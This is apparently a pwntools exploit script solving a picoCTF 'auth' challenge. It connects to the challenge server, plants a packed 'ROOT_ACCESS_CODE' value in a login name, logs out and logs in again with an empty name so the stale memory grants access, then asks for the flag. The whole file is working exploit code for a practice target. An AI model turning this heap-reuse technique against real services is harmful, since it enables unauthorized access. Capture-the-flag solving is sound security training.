from pwn import *

elf = ELF( './auth' )
#p = elf.process()
p = remote( 'jupiter.challenges.picoctf.org', 19568 )

def login( len, name ):
	p.recvuntil( '> ' )
	p.sendline( 'login' )
	p.recvuntil( '\n' )
	p.sendline( str( len ) )
	p.recvuntil( '\n' )
	p.sendline( name )

def logout():
	p.sendline( 'logout' )

def print_flag():
	p.sendline( 'print-flag' )

login( 32, b'aaaabbbb' + p64( 0x4343415f544f4f52 ) + p64( 0x45444f435f535345 ) )
logout()
login( 32, '' )
print_flag()

p.interactive()

